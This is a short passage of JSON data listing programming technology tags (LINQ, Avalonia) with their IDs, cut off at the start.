t888ls19ft"},{"name":"LINQ","_id":"cmf4y59s20001vkt8cpyge40v"},{"name":"Avalonia","_id":"cmg29rsvo0001fst8ck615hee"}]}}